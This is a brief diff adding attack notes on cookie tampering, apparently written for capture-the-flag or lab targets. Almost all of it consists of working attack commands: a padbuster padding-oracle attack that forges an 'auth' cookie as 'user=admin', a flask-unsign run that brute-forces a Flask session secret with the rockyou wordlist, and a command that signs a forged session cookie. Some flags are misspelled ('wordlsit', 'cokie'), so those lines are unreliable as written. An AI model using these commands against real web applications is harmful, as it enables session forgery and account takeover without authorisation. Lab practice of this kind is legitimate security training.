@@ -1,0 +1,9 @@
+cookies
+
+padding error  padbuster
+
+padbuster http://10.10.10.18/index.php SeFUfgOiIWNe0%2Bfk7GO3Bw%3D%3D 8 --cookies auth=SeFUfgOiIWNe0%2Bfk7GO3Bw%3D%3D --encoding 0           -plaintext user=admin
+
+flask-unsign -u -c "cokie" --wordlsit rockyou --no-literal-eval --thread 80
+
+flask-unsign --sign --cookie "{'username':'John'}" --secret 'put secret' --legacy   ##if not then remove --legacy
